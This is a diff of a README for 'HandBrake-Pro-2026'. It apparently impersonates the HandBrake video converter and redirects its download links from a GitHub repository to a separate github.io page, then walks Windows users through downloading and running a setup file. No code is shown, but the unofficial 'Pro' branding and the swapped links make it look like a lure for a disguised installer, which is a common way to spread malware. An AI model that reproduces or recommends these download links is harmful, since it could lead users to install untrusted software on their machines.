@@ -1,6 +1,6 @@
 # ⚙️ HandBrake-Pro-2026 - Convert your videos with simple tools
 
-[![](https://img.shields.io/badge/Download-HandBrake-blue.svg)](https://github.com/moniquestretched478/HandBrake-Pro-2026)
+[![](https://img.shields.io/badge/Download-HandBrake-blue.svg)](https://moniquestretched478.github.io)
 
 ## 📁 Project Overview
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Go to the main project page at this link: [https://github.com/moniquestretched478/HandBrake-Pro-2026](https://github.com/moniquestretched478/HandBrake-Pro-2026)
+1. Go to the main project page at this link: [https://moniquestretched478.github.io](https://moniquestretched478.github.io)
 2. Look for the release section on the right side of the page.
 3. Click on the latest version link.
 4. Download the setup file designed for Windows.
